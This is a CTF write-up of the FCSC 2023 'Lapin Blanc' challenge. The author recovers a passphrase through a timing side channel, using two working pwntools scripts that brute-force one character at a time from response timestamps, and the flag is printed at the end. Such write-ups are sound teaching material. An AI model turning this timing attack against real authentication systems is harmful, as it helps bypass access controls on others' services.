# Lapin Blanc

CTF: FCSC 2023

Category: hardware

Author: erdnaxe

## Description

Can you find the passphrase to access Alice’s Wonderland?

The door is not very patient, you only have 10 minutes to open it. Good luck.

## Overview

This challenge is made of a docker file to run the server locally, it's completely black box.

## Solution

I tried to connect to the server and to send some random chars and I saw that the server gives the timestamps of when it sarts to elaborate an input and when it finish to do it. It's clear this is vulnerable to a time-based side channel attack. There where multiple possibility so here's my assumptions: it's clear that to be vulnerable the server must validate a char at the time but it's possible there is a strlen to validate the length before checking the chars so the first thing I wanted to do was verify the presence of strlen. Then there are three possibilities:  - the passphrase is the same each session
- the passphrase changes each session but its length it's constant
- the passphrase change each session and so does its length
 To do so I wrote a python script to discover which case it is. If I discovered a strlen I could understand if it's one of the first two cases or it's the third one; If there wasn't a strlen I could understand if it's the first case or one of the latter two. 

 ```python
from pwn import *
import matplotlib.pyplot as plt

io = remote("localhost", 4000)
io.recvuntil(b"Answer:")

length_dict = dict()
chars_dict = dict()

def guess_length():
    global length_dict
    for i in range(1, 40):
        io.sendline(b"A" * i)
        start_t = int((io.recvline().split()[0][1:-1]).decode())
        end_t = int((io.recvline().split()[0][1:-1].decode()))
        length_dict[i] = end_t - start_t
        io.recvuntil(b"Answer:")

def guess_chars():
    global chars_dict
    for i in range(0x20, 0x7f):
        io.sendline(i.to_bytes(1, byteorder='big') + b"A")
        start_t = int((io.recvline().split()[0][1:-1]).decode())
        end_t = int((io.recvline().split()[0][1:-1].decode()))
        chars_dict[i] = end_t - start_t
        io.recvuntil(b"Answer:")    

def plot_graph(data):
    keys = list(data.keys())
    values = [data[k] for k in keys]
    labels = [chr(k) if isinstance(k, int) and 0x20 <= k <= 0x7e else str(k)
              for k in keys]
    plt.figure(figsize=(max(8, len(keys) * 0.18), 5))
    bars = plt.bar(range(len(keys)), values)
    if values:
        bars[values.index(max(values))].set_color("red")
        plt.xticks(range(len(keys)), labels, rotation=90, fontsize=8, fontfamily="monospace")
    plt.xlabel("key")
    plt.ylabel("value")
    plt.tight_layout()
    plt.show()

guess_length()
plot_graph(length_dict)
guess_chars()
plot_graph(chars_dict)
io.close()
```

My idea was to test if there is a strlen with a reasonable length (max 40 chars) or if I have to directly bruteforce a char at a time trying each ascii printable byte followed by a b"A". After collecting the samples of the two cases, the script plots them so that I can see if there is some anomaly.




It didn't seem to be a strlen, I ran the script a couple of times and the values were always pretty equal. Instead, the char bruteforce has a clearly spike when the first character is "I". I ran it a couple of times and it was always "I". My conclusion was that there isn't a strlen and that the passphrase is constant. Still I didn't know the length so I did the laziest thing I could think of: after each bruteforce I added the new char to the ones already discovered and I printed the whole passphrase until then. I chose a pretty big range (60) with the intention to stop when I started seeing gibberish.

```python
from pwn import *
import matplotlib.pyplot as plt

io = remote("localhost", 4000)
io.recvuntil(b"Answer:")

chars_dict = dict()
magic_phrase = b""

for _ in range(60):
    for i in range(0x20, 0x7f):
        io.sendline(magic_phrase + i.to_bytes(1, byteorder='big') + b"<")
        start_t = int((io.recvline().split()[0][1:-1]).decode())
        end_t = int((io.recvline().split()[0][1:-1].decode()))
        chars_dict[i] = end_t - start_t
        io.recvuntil(b"Answer:")
    magic_phrase += (max(chars_dict, key=chars_dict.get)).to_bytes(1, byteorder='big')
    print(magic_phrase)

io.close()
```

Fortunately the passphrase was plain English so it was easy to spot its end.



At this point I just used nc to connect to the server and put the phrase as input.



The flag is *FCSC{t1m1Ng_1s_K3y_8u7_74K1nG_u00r_t1mE_is_NEce554rY}*